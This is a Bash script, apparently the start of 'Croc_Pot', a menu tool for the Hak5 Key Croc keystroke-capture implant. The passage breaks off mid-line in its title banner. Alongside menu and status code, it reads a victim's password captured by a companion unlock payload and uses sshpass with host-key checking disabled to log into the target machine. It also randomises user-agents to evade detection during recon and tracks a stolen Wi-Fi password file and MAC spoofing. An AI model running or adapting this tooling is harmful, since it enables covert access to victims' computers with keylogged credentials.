#!/bin/bash

# Title:         Croc_Pot
# Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
#                SSH to HAK5 gear, Reverse ssh tunnel, and more
# Author:        Spywill
# Version:       1.9.2
# Category:      Key Croc

##
#----Variables display lines for separating output & (spinstr='|/-\') displays spinner function variable
##
LINE=$(printf '%0.s=' {1..80})
LINE_=$(printf '%0.s*' {1..10})
LINE_A=$(printf '%0.s-' {1..15})
spinstr='|/-\'
##
# Variables define the source directory for loot files and the backup destination directory
##
source_dir="/root/udisk/loot"
backup_dir="/tmp/loot_backup"
#----Validate IP v4 or v6 address
#----source: http://stackoverflow.com/a/9221063
validate_ip="^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$"
##
#----Create Croc_Pot directories
##
CROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)
for dir in "${CROC_POT_DIR[@]}"; do [[ ! -d "$dir" ]] && mkdir "$dir" || LED B; done
for file in "loot/croc_raw.log"; do [[ ! -f "$file" ]] && echo -n > "$file" || : ; done
##
#----Color Variables
##
green='\e[40;32m'
blue='\e[40;34m'
red='\e[40;31m'
white='\e[40;97m'
yellow='\e[40;93m'
pink='\e[40;35m'
cyan='\e[40;36m'
clear='\e[0m'
##
#----Color Functions
##
function ColorGreen() {
	echo -ne "$green$1$clear"
}
function ColorBlue() {
	echo -ne "$blue$1$clear"
}
function ColorYellow() {
	echo -ne "$yellow$1$clear"
}
function ColorRed() {
	echo -ne "$red$1$clear"
}
function ColorCyan() {
	echo -ne "$cyan$1$clear"
}
##
#----Hide cursor with tput in terminal/restore when exit Function
##
tput civis
function restore_cursor() {
	tput cnorm
	killall Croc_Pot.sh
} 2>/dev/null
trap restore_cursor EXIT
##
#----All Menu color Functions
##
function MenuTitle() {
	echo -e "\n\t\t\t\e[41;38;5;232;1m $1 $clear"
}
function MenuColor() {
	ColorYellow "\t\t\t$2$(ColorGreen '->')\e[40;38;5;202;4m$(awk -v m="$1" '{printf("%-'"$1"'s\n", $0)}' <<< "$3")$4$clear\n"
}
function MenuEnd() {
	unset m_a chartCount
	ColorGreen "\t\t\t0->$(awk -v m="$1" '{printf("%-'"$1"'s\n", $0)}' <<< EXIT)${array[3]}$clear
		\e[38;5;19;1;48;5;245m CHOOSE AN OPTION AND PRESS [ENTER]:$clear`tput sc`"
	while IFS= read -r -n 1 -s; do
		case "$REPLY" in
			$'\0')
				kill -9 "$title_pid" && wait "$title_pid"
				echo -ne "\n"
				break ;;
			$'\177')
				if [ "${#m_a}" -gt 0 ]; then
					echo -ne "\b \b"
					m_a="${m_a::-1}"
				fi ;;
			*)
				chartCount=$(( chartCount + 1 ))
				echo -ne "\e[48;5;202;30m$REPLY$clear"
				m_a+="$REPLY" ;;
		esac
	done
} 2>/dev/null
##
#----Croc_Pot invalid entry
##
function invalid_entry() {
	LED R ; printf '\033[H\033[2J'
	ColorRed '\n\n\t\tINVALID ENTRY PLEASE TRY AGAIN\n'
	sleep 1 ; LED OFF
	printf '\033[H\033[2J'
}
##
#----read user input/add color
##
function read_all() {
	unset r_a chartCount
	echo -ne "\e[38;5;19;1;48;5;245m $1:$clear"
	while IFS= read -r -n 1 -s; do
		case "$REPLY" in
			$'\0')
				echo -ne "$clear\n"
				printf '\033[H\033[2J'
				break ;;
			$'\177')
				if [ "${#r_a}" -gt 0 ]; then
					echo -ne "\b \b"
					r_a="${r_a::-1}"
				fi ;;
			*)
				chartCount=$(( chartCount + 1 ))
				echo -ne "\e[48;5;202;30m$REPLY$clear"
				r_a+="$REPLY" ;;
		esac
	done
}
##
#----function for Breaking while loop [i] to reset counter
##
function reset_broken() {
	i=0
	broken=0
	break_script() {
		broken=1
		trap - SIGINT
	}
trap break_script SIGINT
}
##
#----Display info/how to
##
function Info_Screen() {
	printf '\033[H\033[2J'
	echo -ne "\e[48;5;202;30m$LINE$clear\n"
	ColorYellow "$(awk -v m=80 '{printf("%-80s\n", $0)}' <<< "$1")\n"
	echo -ne "\e[48;5;202;30m$LINE$clear\n"
}
##
#----Display Countdown in minutes and seconds
##
function Countdown() {
	local min="$1"
	local sec="$2"
	while [ "$min" -ge "0" ]; do
		while [ "$sec" -ge "0" ]; do
			if [ "$min" -eq "0" ] && [ "$sec" -le "59" ]; then
				echo -ne "$yellow"
			else
				echo -ne "$green"
			fi
			if [ "$min" -eq "0" ] && [ "$sec" -le "10" ]; then
				echo -ne "$red"
			fi
			if [ "$min" -eq "0" ] && [ "$sec" -eq "0" ]; then
				echo -ne "$clear"
				break
			fi
			local temp=${spinstr#?}
			echo -ne "`tput sc`$(printf "%02d" "$min"):$(printf "%02d" "$sec")$clear\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")$clear$yellow${@:3}$clear\033[0K\r"
			local spinstr=$temp${spinstr%"$temp"}
			let "sec=sec-1"
			sleep 1
		done
		sec=59
		let "min=min-1"
	done
}
##
#----Random the user-agent to help avoid detection on some recon scan
##
function user_agent_random() {
	userAgentList=(
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3"
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152;"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20061201 Firefox/2.0.0.17 (Ubuntu-feisty)"
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B367"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 1.1.4322; InfoPat"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
)
userAgent="${userAgentList[$RANDOM % ${#userAgentList[@]}]}"
}
##
#----Display & Replace user input with Asterisk (*) for password entry
##
function user_input_passwd() {
	unset password chartCount
	echo -ne "\e[38;5;19;1;48;5;245mENTER $2 PASSWORD AND PRESS [ENTER]:$clear"
	while IFS= read -r -n 1 -s; do
		case "$REPLY" in
			$'\0')
				echo -ne "\n"
				break ;;
			$'\177')
				if [ "${#password}" -gt 0 ]; then
					echo -ne "\b \b"
					password="${password::-1}"
				fi ;;
			*)
				chartCount=$(( chartCount + 1 ))
				echo -ne "\e[48;5;202;30m*$clear"
				password+="$REPLY" ;;
		esac
	done
	echo "$password" >> "$1"
}
##
#----Check for OS from saved Croc_Pot_Payload scan
##
function OS_CHECK() {
	[ -f "/root/udisk/tools/Croc_Pot/Croc_OS.txt" ] && sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt || ColorRed 'INVALID OS'
}
##
#----Check for target ip from saved Croc_Pot_Payload scan
##
function os_ip() {
	if [ -f "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
		if [[ "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)" =~ $validate_ip ]]; then
			sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
		else
			ColorRed 'Invalid target IP\n'
		fi
	else
		ColorRed 'Run Croc_Pot_payload to get target IP\n'
	fi
}
##
#----Check for target password (Need to run CrocUnlock payload)
##
function target_pw() {
	if [ -f "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
		sed -i '/\b'"$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"'\b/!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered 2>/dev/null
		sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered
	else
		ColorRed 'Run Croc_Unlock Payload to retrieve target password\n'
	fi
}
##
#----Check for keycroc save password at /tmp/CPW.txt if not enter password and valid password
##
function croc_passwd_check() {
	local salt="$(getent shadow root | cut -d$ -f3)"
	local epassword="$(getent shadow root | cut -d: -f2)"
	if [ -e "/tmp/CPW.txt" ]; then
		local password="$(sed -n 1p /tmp/CPW.txt)"
		local mpassword="$(python -c 'import crypt; print crypt.crypt("'"$password"'", "$6$'"$salt"'")')"
		if [ "$mpassword" == "$epassword" ]; then
			LED G
			ColorGreen "VALID PASSWORD$clear\n"
		else
			LED R
			ColorRed "INVALID PASSWORD PLEASE TRY AGAIN$clear\n"
			rm /tmp/CPW.txt
			croc_passwd_check
		fi
	else
		user_input_passwd /tmp/CPW.txt KEYCROC
		local mpassword="$(python -c 'import crypt; print crypt.crypt("'"$password"'", "$6$'"$salt"'")')"
		if [ "$mpassword" == "$epassword" ]; then
			LED G
			ColorGreen "VALID PASSWORD$clear\n"
		else
			LED R
			ColorRed "INVALID PASSWORD PLEASE TRY AGAIN$clear\n"
			rm /tmp/CPW.txt
			croc_passwd_check
		fi
	fi
}
croc_passwd_check
echo ""
##
#----Check Croc_Pot_Payload, Croc_unlock, Croc_Getonline execution status
##
if [ -f "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
	ColorYellow "Croc_Pot_Payload: $(ColorGreen "OK")\n"
else
	ColorYellow "Croc_Pot_Payload: $(ColorRed "NONE")\n"
fi
if [ -f "/root/udisk/tools/Croc_Pot/wifipass.txt" ]; then
	ColorYellow "Croc_Getonline: $(ColorGreen "OK")\n"
else
	ColorYellow "Croc_Getonline: $(ColorRed "NONE")\n"
fi
if [ -f "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	ColorYellow "Croc_Unlock: $(ColorGreen "OK")\n"
else
	ColorYellow "Croc_Unlock: $(ColorRed "NONE")\n"
fi
sleep 1
##
#----Stop/start ICMP/PORT alert by pressing [kp] in Croc_Pot Main Menu
##
function start_icmp() {
	Info_Screen '-ICMP/PORT alert will run in background
-Alert will appear in terminal inbound ICMP/PORT
-Press [kp] in Main Menu to stop/start ICMP/PORT alert
-Press [b] in any menu to return to previous menu
-Press [p] in any menu Panic button close application, kill wlan0
-Press [st] in Main Menu or Plus_Menu to refresh title every five sec
-Type [lock] in any menu will lock keyboard for 1 min'
	if ps -p "$(sed -n 1p /tmp/port_pid.txt)" || ps -p "$(sed -n 1p /tmp/icmp_pid.txt)"; then
		if ps -p "$(sed -n 1p /tmp/port_pid.txt)"; then
			ColorYellow "Killing port alert\n"
			kill -9 "$(sed -n 1p /tmp/port_pid.txt)"
		fi
		if ps -p "$(sed -n 1p /tmp/icmp_pid.txt)"; then
			ColorYellow "Killing icmp alert\n"
			kill -9 "$(sed -n 1p /tmp/icmp_pid.txt)"
			ICMP_STATUS="$red"
		fi
		killall -9 tcpdump
		sleep 1
	else
##
#----tcpdump, alert the keycroc of inbound ICMP and temporarily disabled inbound ICMP for 1 min
#----Get current network range [ wlan0 interface ]
##
	icmp_alert() {
		ip_address=$(ifconfig wlan0 | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
		ip_info=$(ip -o -f inet addr show wlan0 | awk '{print $4}')
		ip_address=${ip_info%/*}
		netmask_cidr=${ip_info#*/}
		cidr_to_netmask() {
			local cidr=$1
			local mask=$(( 0xffffffff << (32 - cidr) & 0xffffffff ))
			echo "$(( (mask >> 24) & 255 )).$(( (mask >> 16) & 255 )).$(( (mask >> 8) & 255 )).$(( mask & 255 ))"
		}
		netmask=$(cidr_to_netmask "$netmask_cidr")
		IFS=. read -r i1 i2 i3 i4 <<< "$ip_address"
		IFS=. read -r m1 m2 m3 m4 <<< "$netmask"
		network_range="$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).0/$netmask_cidr"
		sleep 1
		until (tcpdump -c 1 -n '((icmp and icmp[0]=8) or (udp and src net '$network_range' and (dst port 33434 or dst port 33534))) and not src host '$ip_address'' | grep -o "IP.*" | sed 's/id.*//g; s/length.*//g' | sed 's/IP/\n&/g'); do
			:
		done
		iptables-save > /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
		iptables -F
		iptables -A OUTPUT -p icmp --icmp-type any -j DROP
		LED C FAST
		printf '\033[H\033[2J'
		ColorRed "Alert: Inbound ICMP detected! Temporarily disabling inbound ICMP for one minute...\n"
		sleep 60
		iptables-restore < /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
		printf '\033[H\033[2J'
		LED OFF
		ColorGreen "Firewall rules are now restored.\n" ; sleep 1
		icmp_alert & echo -ne $! > /tmp/icmp_pid.txt
	}
##
#----tcpdump, alert the keycroc of port scan and temporarily disabled all open ports for 1 min
##
	port_alert() {
		ip_address=$(ifconfig wlan0 | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
		file="/tmp/portscan.pcap"
		tcpdump -i wlan0 '(tcp[tcpflags] & (tcp-syn|tcp-fin|tcp-rst|tcp-ack) != 0) and (not src host '$ip_address') and (not dst port 22) and (not src port 22)' -w $file -G 10 &
		tcpdump_pid=$!
		while true; do
			file_size=$(stat -c %s $file)
			if [ "$file_size" -gt 0 ]; then
				detected_scans=$(tcpdump -nn -r $file 'tcp[tcpflags] & (tcp-syn) != 0' -c 20 2>/dev/null | wc -l)
				if [ "$detected_scans" -ge 20 ]; then
					kill -9 $tcpdump_pid
					LED C FAST
					printf '\033[H\033[2J'
					ColorYellow "Detected $detected_scans port scans. Stopping tcpdump.\n"
					ColorRed "Temporarily disabling all open ports for one minute...\n"
					ColorYellow "List of detected port scans (attacker IPs and target ports):\n"
					tcpdump -nn -r $file 'tcp[tcpflags] & (tcp-syn) != 0' 2>/dev/null | awk '{print "Attacker IP:", $3, "→ Target Port:", $5}' | sed 's/:$//'
					rm $file
					break
				fi
			fi
			sleep 1
		done
		iptables-save > /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
		iptables -F
		iptables -P INPUT DROP
		iptables -P OUTPUT DROP
		iptables -P FORWARD DROP
		sleep 60
		iptables-restore < /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
		printf '\033[H\033[2J'
		LED OFF
		ColorGreen "Firewall rules are now restored.\n" ; sleep 1
		port_alert & echo -ne $! > /tmp/port_pid.txt
	}
		read_all 'START ICMP ALERT Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				ICMP_STATUS="\e[5m$cyan"
				ICMP_CHECK=$(ColorYellow "ICMP ALERT: $(ColorGreen "RUNNING")\n")
				icmp_alert & echo -ne $! > /tmp/icmp_pid.txt ;;
			[nN] | [nN][oO])
				ICMP_STATUS="$red"
				ICMP_CHECK=$(ColorYellow "ICMP ALERT: $(ColorRed "NOT RUNNING")\n") ;;
			*)
				ICMP_STATUS="$red"
				ICMP_CHECK=$(ColorYellow "ICMP ALERT: $(ColorRed "NOT RUNNING")\n")
				invalid_entry ;;
		esac
		read_all 'START PORT ALERT Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				PORT_CHECK=$(ColorYellow "PORT ALERT: $(ColorGreen "RUNNING")\n")
				port_alert & echo -ne $! > /tmp/port_pid.txt ;;
			[nN] | [nN][oO])
				PORT_CHECK=$(ColorYellow "PORT ALERT: $(ColorRed "NOT RUNNING")\n") ;;
			*)
				PORT_CHECK=$(ColorYellow "PORT ALERT: $(ColorRed "NOT RUNNING")\n")
				invalid_entry ;;
		esac
	fi
} 2>/dev/null
start_icmp
##
#----Check current SSID and signal strength
##
SSID_CHECK() {
	output=$(iw dev wlan0 link)
	if [ -z "$output" ]; then
		ColorRed "Error: Not connected to any Wi-Fi network\n"
	fi
	ssid=$(echo "$output" | grep "SSID" | awk '{print $2}')
	info=$(iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | grep -E $ssid)
	signal_strength=$(echo "$info" | awk '{print $1}')
	ColorYellow "Current SSID: $(ColorGreen "$ssid ")\n"
	ColorYellow "Signal Strength: $(ColorGreen "$signal_strength dBm ")\n"
	ColorYellow "Target IP: $(ColorGreen "$(os_ip) ")\n"
	cat /etc/resolv.conf | grep nameserver | awk '{print "\033[40;93mnameserver: \033[0m\033[40;32m"$2" \033[0m"}'
}
SSID_CHECK
echo ""
##
#----Check /tmp/cc-client-error.log count number or errors
##
[ -f /tmp/cc-client-error.log ] && ColorYellow "TMP CLIENT-ERROR COUNT: $(ColorRed "$(wc -l < /tmp/cc-client-error.log)")\n"
##
#----Change keycroc timezone to local timezone with the help of curl
##
user_agent_random
croc_timezone=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone)
if [ -z "$croc_timezone" ]; then
	croc_timezone=$(timedatectl | grep -e 'Time zone' | awk '{print $3}')
	ColorYellow "KEYCROC TIMEZONE SET FOR $(ColorGreen "$croc_timezone")\n"
elif [[ "$croc_timezone" == "$(timedatectl | grep -e 'Time zone' | awk '{print $3}')" ]]; then
	ColorYellow "KEYCROC TIMEZONE SET FOR $(ColorGreen "$croc_timezone")\n"
else
	ColorYellow "CHANGING KEYCROC TIMEZONE TO $(ColorGreen "$croc_timezone")\n"
	timedatectl set-timezone "$croc_timezone"
fi
##
#----check if keyboard PRESENT or MISSING with (KEYBOARD) command
##
function keyboard_check() {
	[ "$(KEYBOARD)" = PRESENT ] && ColorYellow "KEYBOARD: $(ColorGreen "PRESENT $(ColorCyan "$(cat /tmp/mode)")")${clear}\n" || ColorYellow "KEYBOARD: $(ColorRed 'MISSING')\n"
}
keyboard_check
echo ""
##
#----Croc_Pot file count
##
ColorYellow "CROC_POT FILE COUNT LINES: $(ColorGreen "$(wc -l /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")$(ColorYellow ' WORDS: ')$(ColorGreen "$(wc -w /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")$(ColorYellow ' CHARACTERS: ')$(ColorGreen "$(wc -m /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")\n"
##
#----Number of times Croc_Pot has started up
##
function C_P_T() {
	local c_p_t=/root/udisk/tools/Croc_Pot/Count_Croc_Pot.txt
	if [ -f "$c_p_t" ]; then
		:
	else
		echo $(( i++ )) > "$c_p_t"
	fi
	local var="$(sed -n 1p "$c_p_t")"
	local var="$(( var + 1 ))"
	if [ "$var" -eq 1 ]; then
		ColorYellow "CROC_POT FIRST STARTUP THANK YOU AND ENJOY :) $(ColorGreen "$var")\n"
	else
		ColorYellow "CROC_POT STARTUP: $(ColorGreen "$var")$(ColorYellow '  LAST STARTUP: ')$(ColorGreen "$(sed -n "2p" "$c_p_t")")\n"
	fi
	echo -ne "$var\n$(date +%b-%d-%y-%r)\n" > "$c_p_t"
}
C_P_T
##
#----Quick check info on startup
##
ColorCyan "\nUID  PID  PPID C STIME TTY    CMD\n"
ColorGreen "$(ps -ef | grep "Croc_Pot.sh" | awk 'FNR <= 1' | awk '{$7 = ""};1')\n\n"
ColorCyan "$(df -h | sed -n '1p' | awk '{ print toupper($0); }')\n"
ColorGreen "$(df -h | sed -n '2,$p')$clear\n\n"
ColorYellow "CURRENTLY FOUND: $(ColorGreen "$(find . -type f -name "croc_char.log" -exec cat {} + | wc -m)")$(ColorYellow ' CHARACTERS IN croc_char.log')\n"
ColorYellow "INSTALLED PAYLOADS: $(ColorGreen "$(ls /root/udisk/payloads | grep -c ".txt")")\n"
for file_path in $(find "/root/udisk/payloads" -maxdepth 1 -type f); do
	ColorCyan "\t$(basename "$file_path")$clear\n"
done ; echo ""
##
#----Check NumLock state ON or OFF
##
nc -vz -w 1 "$(os_ip)" 22 &>"/dev/null"
if [[ $? -ne 0 ]]; then
	ColorYellow "NUMLOCK STATE:$(ColorRed ' UNKNOWN ')$(ColorYellow 'Unable to ping target')\n"
elif [[ "${#args[@]}" -eq 0 ]]; then
	if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
		TARGET_USERNAME=$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			if [ -f /root/udisk/tools/Croc_Pot/NumLock.txt ]; then
				if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/NumLock.txt)" = True ]; then
					ColorYellow "NUMLOCK STATE: $(ColorGreen 'ON')\n"
				elif [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/NumLock.txt)" = False ]; then
					ColorYellow "NUMLOCK STATE: $(ColorRed 'OFF')\n"
				fi
			else
				ColorYellow "NUMLOCK STATE: $(ColorRed 'UNKNOWN Run Croc_Pot_Payload')\n"
			fi
		elif [ "$(OS_CHECK)" = LINUX ]; then
			NUM_STATUS="$(sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'cat /sys/class/leds/input*::numlock/brightness | uniq')"
			if [ "$NUM_STATUS" = 0 ]; then
				QUACK NUMLOCK
				ColorYellow "NUMLOCK STATE: $(ColorGreen 'TURNED TO ON STATE')\n"
			elif [ "$NUM_STATUS" = 1 ]; then
				ColorYellow "NUMLOCK STATE: $(ColorGreen "ON")\n"
			else
				ColorYellow "NUMLOCK STATE: $(ColorRed 'UNKNOWN')\n"
			fi
		fi
	else
		ColorYellow "NUMLOCK STATE:$(ColorRed ' UNKNOWN ')$(ColorYellow '-Run Croc_unlock payload-')\n"
	fi
fi
##
#----Save keycroc Original Mac address, Check Original Mac Address or spoof
##
function check_mac() {
	if [ -f "/root/udisk/tools/Croc_Pot/croc_original_mac.txt" ]; then
		test_mac="$(cat /sys/class/net/"$(ip route show default | awk '/default/ {print $5}')"/address)"
		if [ "$test_mac" = "$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)" ]; then
			ColorYellow "ORIGINAL MAC: $(ColorGreen "$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)")\n"
		else
			ColorYellow "SPOOF MAC: $(ColorRed "$test_mac")\n"
		fi
	else
		cat /sys/class/net/"$(ip route show default | awk '/default/ {print $5}')"/address > /root/udisk/tools/Croc_Pot/croc_original_mac.txt 2>/dev/null
		ColorYellow "ORIGINAL MAC: $(ColorGreen "$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)")\n"
	fi
}
check_mac
echo -e "$ICMP_CHECK$PORT_CHECK"
##
#----Croc_Pot title function
#----PRESS CTRL + C to break loop stopping Croc_Pot title from refreshing
#----PRESS st then enter in main_menu or Plus_menu to refresh Croc_Pot title every five sec
##
reset_broken
function croc_title() {
	LED OFF
	printf '\033[H\033[2J'
	local k_b="$(awk -v m=24 '{printf("%-24s\n", $0)}' <<< "$(lsusb | sed -n '/Linux Foundation\|Realtek Semiconductor/!p' | sed 's/^.*ID/ID/' | sed 's/ID//' | sed 's/,//' | awk '{print $1,$2}')")"
##
#----Test internet connection
##
internet_test() {
	(nc -vz -w 1 8.8.8.8 53) && I_T="${green}ONLINE" || I_T="${red}OFFLINE"
}
internet_test > /dev/null 2>&1
##
#----Random Unicode value in the range 0x0400-0x04F7, white and green contain ANSI escape codes
##
ramdom_char() {
	if (( RANDOM % 2 )); then
		selected_color="$white"
	else
		selected_color="$green"
	fi
	default_char() {
		special_chars=("!" "@" "#" "$" "%" "^" "&" "*" "(" ")" "_" "+" ":" ">" "<" "?" "," "." "/" "'" ";" "0" "1" "∞" "☼" "‼" "=" "X" "~")
		rand_index=$(( RANDOM % ${#special_chars[@]} ))
		selected_char=${special_chars[$rand_index]}
		echo -ne "${selected_color} $selected_char"
	}
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		default_char
	elif [ "$(OS_CHECK)" = LINUX ]; then
		rand=$(printf '%x' $((RANDOM%256+1024)))
		dec=$(printf "%d" "$((0x$rand))")
		if [[ $dec -lt 1155 || $dec -gt 1161 ]]; then
			printf "${selected_color} \u$rand"
		else
			echo -ne "${selected_color} #"
		fi
	else
		default_char
	fi
}
##
#----Croc_Pot title display info
##
	while : ; do
		ColorGreen "`tput cup 0 0`$clear\e[41;38;5;232;1m$LINE$clear
$(ColorGreen '                 CROC_POT      ')$(ColorBlue 'V-1.9.2')$(ramdom_char)$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') IP: $(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)")")$(awk -v m=22 '{printf("%-22s\n", $0)}' <<< "$I_T")$clear
$(ColorBlue "AUTHOR: $(ColorYellow 'SPYWILL')")$(ColorCyan "  $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< "$(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g')")")$(ramdom_char)$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') VER: $(cat /root/udisk/version.txt) ")$ICMP_STATUS*$clear$(ColorYellow "TARGET:$(ColorGreen "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(OS_CHECK)")")")
$(ColorBlue "$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "${croc_timezone^^}")")$(ColorCyan "$(date +%b-%d-%y-%r | awk '{ print toupper($0); }')")$(ramdom_char)$clear$(ColorYellow ' KEYBOARD:')$(ColorGreen "$(sed -n 13p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ")$(ColorYellow "ID:$(ColorGreen "${k_b^^}")")
